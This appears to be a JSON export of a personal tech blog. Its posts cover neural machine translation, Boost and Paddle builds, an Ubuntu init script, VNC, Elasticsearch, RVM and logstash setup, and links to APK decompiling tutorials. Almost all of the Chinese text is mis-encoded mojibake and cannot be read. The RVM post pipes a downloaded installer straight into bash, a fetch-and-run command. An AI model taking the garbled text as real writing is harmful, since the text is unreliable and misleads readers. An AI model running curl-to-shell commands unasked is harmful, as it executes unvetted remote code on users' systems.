éš¾ä»¥åˆ©ç”¨å…¨å±€çš„ç‰¹å¾ ä¾èµ–è®¸å¤šé¢„å¤„ç†ç¯èŠ‚ï¼Œ å¦‚è¯è¯­å¯¹é½ã€åˆ†è¯æˆ–ç¬¦å·åŒ–ç­‰ æ¯ä¸ªç¯èŠ‚çš„é”™è¯¯ä¼šé€æ­¥ç´¯ç§¯ï¼Œ å¯¹æœ€ç»ˆç¿»è¯‘å½±å“ä¹Ÿè¶Šæ¥è¶Šå¤š æ·±åº¦å­¦ä¹ æŠ€æœ¯(ç«¯åˆ°ç«¯çš„ç¥ç»ç½‘ç»œæœºå™¨ç¿»è¯‘)End-to-End Neural Machine Translation, ç®€ç§° NMT 1. åˆ©ç”¨ç¥ç»ç½‘ç»œæ¥æ”¹è¿›å…¶ä¸­çš„å…³é”®æ¨¡å— 2. ç›´æ¥ç”¨ç¥ç»ç½‘ç»œå°†æºè¯­è¨€æ˜ å°„åˆ°ç›®æ ‡è¯­è¨€ åºåˆ—åˆ°åºåˆ—çš„å­¦ä¹ é—®é¢˜ä¸»è¦æ€æƒ³(2014å¹´) &quot;Sequence to Sequence Learning with Neural Networks&quot; &quot;Learning Phrase Representation using RNN Encoder-Decoder for Statistical Machine Translation&quot; åº”ç”¨åœºæ™¯ æ–‡æœ¬åˆ°æ–‡æœ¬: å¦‚æ™ºèƒ½æœºå™¨äººï¼Œæ–‡æœ¬æ‘˜è¦ï¼Œç»˜ç”»å»ºæ¨¡ å›¾åƒåˆ°æ–‡æœ¬: å¦‚çœ‹å›¾è¯´è¯ï¼Œå›¾ç‰‡é—®ç­”ï¼Œå›¾ç‰‡æœç´¢ æ–‡æœ¬åˆ°å›¾åƒ: å¦‚åŸºäºæ–‡æœ¬æè¿°ç”Ÿæˆä¸€å¼ å›¾ç‰‡ è§†é¢‘åˆ°æ–‡æœ¬: å¦‚çœ‹è§†é¢‘è¯´è¯ï¼Œ è§†é¢‘æœç´¢(è§†é¢‘ ------&gt; ä¸€å¥è¯æˆ–å¤šå¥è¯) LSTM å›é¡¾(è¯¦è§æƒ…æ„Ÿåˆ†æè¯¾ç¨‹) LSTMç‰¹ç‚¹: è®°å¿†å•å…ƒã€è¾“å…¥é—¨ã€é—å¿˜é—¨åŠè¾“å‡ºé—¨ å¥½å¤„: å¤§å¤§æå‡äº† RNN å¤„ç†è¿œè·ç¦»ä¾èµ–é—®é¢˜çš„èƒ½åŠ› GRU ä»‹ç» LSTMçš„ç®€åŒ–ç‰ˆæœ¬ï¼Œ åªæœ‰ä¸¤ä¸ªé—¨: é‡ç½®é—¨å’Œæ›´æ–°é—¨ åœ¨å¤šä¸ªä»»åŠ¡ä¸Šéƒ½å’ŒLSTMæœ‰ç›¸è¿‘çš„è¡¨ç° ç¼–ç -è§£ç å™¨æ¡†æ¶ç¼–ç ï¼šå°†æ•´ä¸ªæºåºåˆ—è¡¨å¾æˆä¸€ä¸ªå‘é‡è§£ç :é€šè¿‡æœ€å¤§åŒ–é¢„æµ‹åºåˆ—æ¦‚ç‡ï¼Œ ä»ä¸­è§£ç å‡ºæ•´ä¸ªç›®æ ‡åºåˆ—è§£ç æ€è·¯ è®¡ç®—ä¸‹ä¸€ä¸ªéšå±‚çŠ¶æ€ æ ¹æ®éšå±‚çŠ¶æ€å¾—åˆ°è¯æ¦‚ç‡ æ ¹æ®è¯æ¦‚ç‡è®¡ç®—ä»£ä»·(è®­ç»ƒ)æˆ–é‡‡æ ·å‡ºå•è¯(ç”Ÿæˆ) å¾ªç¯ä»¥ä¸Šä¸‰ä¸ªæ­¥éª¤ è®­ç»ƒ: ç›´åˆ°ç›®æ ‡è¯­è¨€åºåˆ—ä¸­çš„æ‰€æœ‰è¯å¤„ç†å®Œæ¯• ç”Ÿæˆ: ç›´åˆ°è·å¾—å¥å­ç»“æŸæ ‡è®°&lt;e&gt;æˆ–è¶…è¿‡å¥å­çš„æœ€å¤§ç”Ÿæˆé•¿åº¦ æ•°æ®é›†WMT14 æ•°æ®é›†","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://wangxiuwen.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"author":"wangxiuwen"},{"title":"paddle åº“ç¼–è¯‘å®‰è£…","slug":"history/tech/59ca0da0c51d80451db0c00d","date":"2017-09-25T20:19:44.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59ca0da0c51d80451db0c00d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59ca0da0c51d80451db0c00d/","excerpt":"","text":"å®˜æ–¹æ–‡æ¡£ï¼šhttp://doc.paddlepaddle.org/develop/doc/getstarted/build_and_install/build_from_source_en.htmlå‚è€ƒè¿™é‡Œ å®‰è£… boost åº“https://blog.qianrushi.org/topic/59c9ff4dc51d80451db0c00c","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"linux boost åº“ å®‰è£…","slug":"history/tech/59c9ff4dc51d80451db0c00c","date":"2017-09-25T19:18:37.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59c9ff4dc51d80451db0c00c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59c9ff4dc51d80451db0c00c/","excerpt":"","text":"ä¸‹è½½ wget https://dl.bintray.com/boostorg/release/1.65.1/source/boost_1_65_1.tar.bz2 è§£å‹ tar -xjvf boost_1_65_1.tar.bz2 -C /usr/local/ mv /usr/local/boost_1_65_1 /usr/local/boost å®‰è£…bootstrap.sh è„šæœ¬æ‰§è¡Œä¹‹åä¼šäº§ç”Ÿ bjam å’Œ b2 ä¸¤ä¸ªå·¥å…·cd /usr/local/boost_1_65_1 ./bootstrap.sh ./b2 install å®‰è£…å®Œæˆä¹‹åï¼š/usr/local/include ä¸‹ä¼šäº§ç”Ÿboostçš„å¤´æ–‡ä»¶ /usr/local/libä¸‹é¢ä¼šäº§ç”Ÿbooståº“ å¯¼å‡ºç¯å¢ƒå˜é‡BOOST_ROOT ä¸º boostçš„è§£å‹è·¯å¾„vim /etc/profile export BOOST_ROOT=/usr/local/boost export BOOST_INCLUDE=/usr/local/include/boost export BOOST_LIB==/usr/local/lib source /etc/profile æ‰§è¡Œsudo chmod +x boost.sh ./boost.sh æµ‹è¯•#include &lt;boost/utility.hpp&gt; #include &lt;iostream&gt; using namespace std; int main() { return 0; }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntu æ¡Œé¢ç‰ˆé…ç½®å¼€æœºå¯åŠ¨è„šæœ¬","slug":"history/tech/59c86c0cc51d80451db0c009","date":"2017-09-25T02:38:04.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59c86c0cc51d80451db0c009/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59c86c0cc51d80451db0c009/","excerpt":"","text":"ç¼–è¾‘æ–‡ä»¶ vim /etc/init.d/startup.sh #! /bin/sh ### BEGIN INIT INFO # Provides: supervisord # Required-Start: $remote_fs # Required-Stop: $remote_fs # Default-Start: 2 3 4 5 # Default-Stop: 0 1 6 # Short-Description: Example initscript # Description: This file should be used to construct scripts to be # placed in /etc/init.d. ### END INIT INFO # Author: Dan MacKinlay &lt;danielm@phm.gov.au&gt; # Based on instructions by Bertrand Mathieu # http://zebert.blogspot.com/2009/05/installing-django-solr-varnish-and.html # Do NOT &quot;set -e&quot; # PATH should only include /usr/* if it runs after the mountnfs.sh script PATH=/sbin:/usr/sbin:/bin:/usr/bin DESC=&quot;Description of the service&quot; NAME=supervisord DAEMON=/usr/local/bin/supervisord DAEMON_ARGS=&quot;-c /usr/local/supervisord.conf&quot; PIDFILE=/var/run/$NAME.pid SCRIPTNAME=/etc/init.d/$NAME # Exit if the package is not installed [ -x &quot;$DAEMON&quot; ] || exit 0 # Read configuration variable file if it is present [ -r /etc/default/$NAME ] &amp;&amp; . /etc/default/$NAME # Load the VERBOSE setting and other rcS variables . /lib/init/vars.sh # Define LSB log_* functions. # Depend on lsb-base (&gt;= 3.0-6) to ensure that this file is present. . /lib/lsb/init-functions # # Function that starts the daemon/service # do_start() { # Return # 0 if daemon has been started # 1 if daemon was already running # 2 if daemon could not be started start-stop-daemon --start --quiet --pidfile $PIDFILE --exec $DAEMON --test &gt; /dev/null \\ || return 1 start-stop-daemon --start --quiet --pidfile $PIDFILE --exec $DAEMON -- \\ $DAEMON_ARGS \\ || return 2 # Add code here, if necessary, that waits for the process to be ready # to handle requests from services started subsequently which depend # on this one. As a last resort, sleep for some time. } # # Function that stops the daemon/service # do_stop() { # Return # 0 if daemon has been stopped # 1 if daemon was already stopped # 2 if daemon could not be stopped # other if a failure occurred start-stop-daemon --stop --quiet --retry=TERM/30/KILL/5 --pidfile $PIDFILE --name $NAME RETVAL=&quot;$?&quot; [ &quot;$RETVAL&quot; = 2 ] &amp;&amp; return 2 # Wait for children to finish too if this is a daemon that forks # and if the daemon is only ever run from this initscript. # If the above conditions are not satisfied then add some other code # that waits for the process to drop all resources that could be # needed by services started subsequently. A last resort is to # sleep for some time. start-stop-daemon --stop --quiet --oknodo --retry=0/30/KILL/5 --exec $DAEMON [ &quot;$?&quot; = 2 ] &amp;&amp; return 2 # Many daemons don't delete their pidfiles when they exit. rm -f $PIDFILE return &quot;$RETVAL&quot; } # # Function that sends a SIGHUP to the daemon/service # do_reload() { # # If the daemon can reload its configuration without # restarting (for example, when it is sent a SIGHUP), # then implement that here. # start-stop-daemon --stop --signal 1 --quiet --pidfile $PIDFILE --name $NAME return 0 } case &quot;$1&quot; in start) [ &quot;$VERBOSE&quot; != no ] &amp;&amp; log_daemon_msg &quot;Starting $DESC&quot; &quot;$NAME&quot; do_start case &quot;$?&quot; in 0|1) [ &quot;$VERBOSE&quot; != no ] &amp;&amp; log_end_msg 0 ;; 2) [ &quot;$VERBOSE&quot; != no ] &amp;&amp; log_end_msg 1 ;; esac ;; stop) [ &quot;$VERBOSE&quot; != no ] &amp;&amp; log_daemon_msg &quot;Stopping $DESC&quot; &quot;$NAME&quot; do_stop case &quot;$?&quot; in 0|1) [ &quot;$VERBOSE&quot; != no ] &amp;&amp; log_end_msg 0 ;; 2) [ &quot;$VERBOSE&quot; != no ] &amp;&amp; log_end_msg 1 ;; esac ;; #reload|force-reload) # # If do_reload() is not implemented then leave this commented out # and leave 'force-reload' as an alias for 'restart'. # #log_daemon_msg &quot;Reloading $DESC&quot; &quot;$NAME&quot; #do_reload #log_end_msg $? #;; restart|force-reload) # # If the &quot;reload&quot; option is implemented then remove the # 'force-reload' alias # log_daemon_msg &quot;Restarting $DESC&quot; &quot;$NAME&quot; do_stop case &quot;$?&quot; in 0|1) do_start case &quot;$?&quot; in 0) log_end_msg 0 ;; 1) log_end_msg 1 ;; # Old process is still running *) log_end_msg 1 ;; # Failed to start esac ;; *) # Failed to stop log_end_msg 1 ;; esac ;; *) #echo &quot;Usage: $SCRIPTNAME {start|stop|restart|reload|force-reload}&quot; &gt;&amp;2 echo &quot;Usage: $SCRIPTNAME {start|stop|restart|force-reload}&quot; &gt;&amp;2 exit 3 ;; esac : æ›´æ–° # åœ¨è¿™é‡Œ 60 è¡¨æ˜ä¸€ä¸ªä¼˜å…ˆçº§ï¼Œè¶Šé«˜è¡¨ç¤ºæ‰§è¡Œçš„è¶Šæ™š update-rc.d startup.sh defaults 60 ç§»é™¤è„šæœ¬sudo update-rc.d -f startup.sh remove","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ç¾å›¾åˆ†äº«ç¬”è®°","slug":"history/tech/59c9031ac51d80451db0c00b","date":"2017-09-25T01:22:34.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59c9031ac51d80451db0c00b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59c9031ac51d80451db0c00b/","excerpt":"","text":"è¯„è®ºååƒåœ¾è¯„è®ºåƒåœ¾åˆ†ç±»ï¼šå¹¿å‘Šä¼ æ’­ æ¶‰é»„æ¶‰æ”¿ æ‰¹é‡æ”»å‡» è¯„è®ºè´­ä¹° äººå·¥æ±‚å…³æ³¨ åƒåœ¾è¯†åˆ«ç®—æ³•ï¼šæœ€é•¿å…¬å…±å­ä¸²ç®—æ³•lruèšç±»è¡Œä¸ºè¯†åˆ«:æ•°æ®é¢„å¤„ç†è¡Œä¸ºåˆ†æ:å…³æ³¨ç‚¹èµç­‰å¾—åˆ°è¾…åŠ©ç”¨æˆ·è¡Œä¸ºå„ä¸ªç»´åº¦çš„è´¨é‡ç”¨æˆ·åˆ†æï¼šå›å½’ç®—æ³•æ¨¡å‹éªŒè¯ï¼šäººå·¥ç­›é€‰ç”¨æˆ·åé¦ˆâ€¦ æ–‡æœ¬åˆ†æç£æ€§åˆ†æï¼Œ ç²’å­èšç½‘åˆ†æï¼Ÿ æ—¶é—´è¡°å‡ï¼Œçƒ­åŠ›å­¦å®šå¾‹äº‹ä»¶çš„ ä¸Šå‡ è¡°å‡ï¼Œ æ–°å¢ï¼Œ è®¡ç®—å‡ºäº‹ä»¶çš„çƒ­ç‚¹è¯„è®º åˆ†ä¸º æ­£å‘ è´Ÿå‘ ä¸­æ€§æƒ…æ„Ÿè¯åŒ¹é…æ”¯æŒå‘é‡æœº æœç´¢æ¼”è¿›æ¨¡å‹ï¼šç¹ç®€å¤§å°å†™è½¬æ¢ å€’æ’ç´¢å¼• ç›¸å…³åº¦æ’åº ç»“åˆäº§å“ç­–ç•¥äºŒæ¬¡æ’åº é—®é¢˜:æœç´¢è¯å¤ªé•¿ï¼Œå½±å“æ€§èƒ½ å•ç´¢å¼•èµ„æºæµªè´¹ï¼Œæ€§èƒ½å‹åŠ› ä½è´¨é‡è§†é¢‘ä¸å€¼å¾—ç´¢å¼• è°ƒä¼˜æ¨¡å‹ï¼šè‹±æ–‡ n-gram åˆ‡è¯ï¼Œ ç›´æ¥æŸ¥è¯¢ï¼Œç›¸å…³åº¦è®¡ç®—æœ‰é—®é¢˜åˆ†çº§ç´¢å¼• ï¼šå…ˆæŸ¥è¯¢ä¸€çº§ç´¢å¼•ï¼Œ ä¸€çº§ç´¢å¼•ä¸è¶³ï¼Œ å¯¹äºŒçº§ç´¢å¼•è¿›è¡Œè¡¥å……æŸ¥è¯¢ ä¸€çº§ç´¢å¼•ï¼ŒäºŒçº§ç´¢å¼•æ•°æ®æ¯”ä¾‹ 1ï¼š40 (5äº¿è§†é¢‘ä¸­åªæœ‰ä¸€åƒä¸‡) ä¸€çº§ç´¢å¼•ï¼š äººå·¥ç­›é€‰ï¼Œä¼˜è´¨ï¼Œ ç¦»çº¿ ccr ç®—æ³•ï¼Œ å‰”é™¤ä½è½¬åŒ–è§†é¢‘æ•°æ® è§†é¢‘æ–‡æœ¬åŒ¹é…åº¦é«˜ï¼Œä¸ä»£è¡¨è½¬åŒ–ç‡é«˜ï¼Œæ ¹æ®æ’­æ”¾æ•°ï¼Œç‚¹èµæ•°ï¼Œè¯„è®ºæ•°ï¼Œæœç´¢æ„å›¾ç‰¹å¾ï¼ˆæœç´¢è¯åœ¨å¹³å°çš„ç±»åˆ«å±æ€§æ˜ å°„ï¼Œåˆ†ä¸ºä¸‰ç±»ï¼š ç”¨æˆ·æ„å›¾ç‰¹å¾(ç”¨æˆ·è§†é¢‘ï¼Œä¸ç”¨æˆ·æœ‰å…³çš„è§†é¢‘)ï¼Œè§†é¢‘åˆ†ç±»ç‰¹å¾(ä½“è‚²ï¼Œç¾é£Ÿï¼Œ æ—…æ¸¸, åˆ†ææŸ¥è¯¢åœ¨è§†é¢‘æ ‡ç­¾ä¸­çš„æ¦‚ç‡ï¼Œåšç‰¹å¾æ˜ å°„ )ï¼Œå¹³å°è§†é¢‘ç‰¹å¾ï¼ˆé•¿è§†é¢‘ï¼ŒçŸ­è§†é¢‘ï¼Œ ç›´æ’­ï¼Œ æ•™ç¨‹ç±»åå‘äºé•¿è§†é¢‘ï¼Œ åƒé¥­é€‚åˆç›´æ’­ï¼‰ï¼‰ï¼Œ å¯¹å€¾å‘æ¦‚ç‡å‘è§†é¢‘ç‰¹å¾åšæ˜ å°„ã€‚å¯¹äºæ„å›¾ç‰¹å¾ï¼Œä½¿ç”¨æœç´¢åé¦ˆæ—¥å¿—ï¼Œåšæ¨¡å‹è®­ç»ƒã€‚ é•¿å°¾æŸ¥è¯¢è¯­ä¹‰å½’ä¸€æŸ¥è¯¢é‡å†™ï¼šæ‹¼éŸ³è½¬åŒ– æŸ¥è¯¢æ—¶åºåˆ†æï¼š å¤šæ¬¡æŸ¥è¯¢è¯ ååŒåˆ†æ ä¸ªæ€§åŒ–ï¼šç”¨æˆ·ç”»åƒï¼š æ€§åˆ«ï¼Œ å¹´é¾„ï¼Œ æ”¶å…¥ï¼Œ èŒä¸š ç”¨æˆ·å…´è¶£ï¼š è§‚çœ‹å…´è¶£ï¼Œ ä½“ç°åœ¨æ ‡ç­¾ä½“ç³», ç¾é£Ÿï¼Œæ—…æ¸¸ç­‰ ç”¨æˆ·ç¯å¢ƒï¼š æ‰‹æœºæœºå‹ï¼Œåœ°ç‚¹ï¼Œç½‘ç»œï¼Œæ—¶é—´ ç”¨æˆ·ç¤¾ç¾¤ï¼š ç›¸ä¼¼çš„ç”¨æˆ·çœ‹åŒæ ·çš„è§†é¢‘ã€‚ ç”¨æˆ·ä¸ªæ€§åŒ–æ’åºï¼šæ•°æ®ä¸€æ¬¡æ’åºåï¼Œ å– top N æ•°æ®ï¼Œè¿›è¡Œæè¿°æ‰©å±•ï¼Œå†è¿›è¡Œæ•°æ®äºŒæ¬¡æ’åºã€‚ æè¿°æ‰©å±•ï¼š é€šè¿‡å›¾åƒåˆ†ç±»æŠ€æœ¯è¯†åˆ«è§†é¢‘ä¸€çº§æ ‡ç­¾ è¯­éŸ³è¯†åˆ« baidu æœºå™¨å­¦ä¹ æˆ¿äº§åˆ†åŒºåˆ†æï¼špoi ä¿¡æ¯","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntu é…ç½® vncserver,  è§£å†³ vnc ç°å±","slug":"history/tech/59c8ae7cc51d80451db0c00a","date":"2017-09-24T19:21:32.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59c8ae7cc51d80451db0c00a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59c8ae7cc51d80451db0c00a/","excerpt":"","text":"å®‰è£…apt-get install vnc4server ä¿®æ”¹é…ç½®æ–‡ä»¶vim ~/.vnc/xstartup #!/bin/sh # Uncomment the following two lines for normal desktop: #unset SESSION_MANAGER #exec /etc/X11/xinit/xinitrc # #[ -x /etc/vnc/xstartup ] &amp;&amp; exec /etc/vnc/xstartup #[ -r $HOME/.Xresources ] &amp;&amp; xrdb $HOME/.Xresources #xsetroot -solid grey #vncconfig -iconic &amp; #x-terminal-emulator -geometry 80x24+10+10 -ls -title &quot;$VNCDESKTOP Desktop&quot; &amp; #export STARTUP=&quot;/usr/bin/gnome-session --session=Ubuntu&quot; #$STARTUP def export XKL_XMODMAP_DISABLE=1 unset SESSION_MANAGER unset DBUS_SESSION_BUS_ADDRESS gnome-panel &amp; gnome-settings-daemon &amp; metacity &amp; nautilus &amp; gnome-terminal &amp; å¯åŠ¨ vncserver è¿æ¥ä½¿ç”¨ vnc å®¢æˆ·ç«¯ è¾“å…¥ ip:1","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"elasticsearch æ·»åŠ å­—æ®µè®¾ç½®é»˜è®¤å€¼ã€‚","slug":"history/tech/59c08907c51d80451db0c006","date":"2017-09-19T03:03:35.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59c08907c51d80451db0c006/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59c08907c51d80451db0c006/","excerpt":"","text":"å¼€å¯åŠ¨æ€è„šæœ¬åŠŸèƒ½ï¼Œåœ¨config/elasticsearch.ymlæ–‡ä»¶,åœ¨æœ€åæ·»åŠ ä»¥ä¸‹ä»£ç ï¼šscript.inline: on script.indexed: on script.file: on é…ç½®åï¼Œé‡å¯Elasticsearchã€‚POSThttp://127.0.0.1:9200/my_index/my_type/_update_by_query { &quot;script&quot;: { &quot;inline&quot;: &quot;if (ctx._source.status_code == null) {ctx._source.status_code= '02'}&quot; } } ä½¿ç”¨string ç±»å‹çš„å­—æ®µè®¾ç½®é»˜è®¤å€¼http://127.0.0.1:9200/my_index/mapp/my_type put { &quot;properties&quot;: { &quot;status_code&quot;: { &quot;type&quot;: &quot;string&quot;, &quot;index&quot;: &quot;not_analyzed&quot;, &quot;null_value&quot;: &quot;NULL&quot; } } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"å®‰å“ apk ç ´è§£","slug":"history/tech/59bb2d25c51d80451db0c005","date":"2017-09-15T01:30:13.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59bb2d25c51d80451db0c005/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59bb2d25c51d80451db0c005/","excerpt":"","text":"AXMLPrinter2,smali,baksmaliï¼šhttp://blog.csdn.net/android_tutor/article/details/5724435mainfestï¼šhttp://blog.csdn.net/linux_eve/article/details/5529312Android APKåç¼–è¯‘å°±è¿™ä¹ˆç®€å• è¯¦è§£ï¼ˆé™„å›¾ï¼‰ï¼šhttp://blog.csdn.net/vipzjyno1/article/details/21039349/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"é˜¿é‡Œ maven åº“","slug":"history/tech/59b8eb42c51d80451db0c004","date":"2017-09-12T20:24:34.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59b8eb42c51d80451db0c004/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59b8eb42c51d80451db0c004/","excerpt":"","text":"http://maven.aliyun.com/nexus/#nexus-search;quick~mysql","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å®‰è£…rvm å¤šç‰ˆæœ¬ Ruby ç¯å¢ƒ ç®¡ç†å’Œåˆ‡æ¢å·¥å…·","slug":"history/tech/59b600f21db485493d6cc384","date":"2017-09-11T03:20:18.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59b600f21db485493d6cc384/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59b600f21db485493d6cc384/","excerpt":"","text":"å®˜ç½‘https://rvm.io/ RVM å®‰è£…$ gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 $ \\curl -sSL https://get.rvm.io | bash -s stable $ source ~/.bashrc $ source ~/.bash_profile ä¿®æ”¹ RVM çš„ Ruby å®‰è£…æºåˆ° Ruby China çš„ Ruby é•œåƒæœåŠ¡å™¨ï¼Œè¿™æ ·èƒ½æé«˜å®‰è£…é€Ÿåº¦$ mkdir -p ~/.rvm/user/ $ echo &quot;ruby_url=http://cache.ruby-china.org/pub/ruby&quot; &gt; ~/.rvm/user/db åˆ—å‡ºå·²çŸ¥çš„ Ruby ç‰ˆæœ¬rvm list known å®‰è£…ä¸€ä¸ª Ruby ç‰ˆæœ¬rvm install 2.2.0 --disable-binary åˆ‡æ¢ Ruby ç‰ˆæœ¬rvm use 2.2.0 å¦‚æœæƒ³è®¾ç½®ä¸ºé»˜è®¤ç‰ˆæœ¬ï¼Œè¿™æ ·ä¸€æ¥ä»¥åæ–°æ‰“å¼€çš„æ§åˆ¶å°é»˜è®¤çš„ Ruby å°±æ˜¯è¿™ä¸ªç‰ˆæœ¬rvm use 2.2.0 --default æŸ¥è¯¢å·²ç»å®‰è£…çš„rubyrvm list å¸è½½ä¸€ä¸ªå·²å®‰è£…ç‰ˆæœ¬rvm remove 1.8.7 å®‰è£… bundlergem install bundle","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"logstash æ’ä»¶å¼€å‘æŠ¥é”™è§£å†³","slug":"history/tech/59b5ff901db485493d6cc383","date":"2017-09-11T03:14:24.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59b5ff901db485493d6cc383/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59b5ff901db485493d6cc383/","excerpt":"","text":"bundle install æŠ¥é”™ï¼šThere was a NoMethodError while loading logstash-input-rss.gemspec: undefined method metadata=' for #&lt;Gem::Specification name=logstash è§£å†³ï¼šå®‰è£…rubyæ–°ç‰ˆï¼šhttp://blog.qianrushi.org/topic/59b600f21db485493d6cc384 bundle install æ¥ç€æŠ¥é”™ï¼šCould not find gem 'logstash-devutils' in any of the gem sources listed in your Gemfile. è§£å†³ï¼šå®‰è£… jrubyrvm install jruby rvm use jruby-9.1.13.0 --default gem install bundle å†æ¬¡å®‰è£…ä¾èµ–åŒ…ï¼š bundle install æˆåŠŸ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"sublime å‘½ä»¤è¡Œå¯åŠ¨","slug":"history/tech/59b3f7321db485493d6cc382","date":"2017-09-09T02:14:10.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59b3f7321db485493d6cc382/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59b3f7321db485493d6cc382/","excerpt":"","text":"åœ¨ç¨‹åºç›®å½•ä¸­æ–°å»ºæ‰¹å¤„ç†æ–‡ä»¶ subl.bat:@å’Œ echo ä¹‹é—´æ²¡æœ‰ç©ºæ ¼ @ echo off start sublime_text 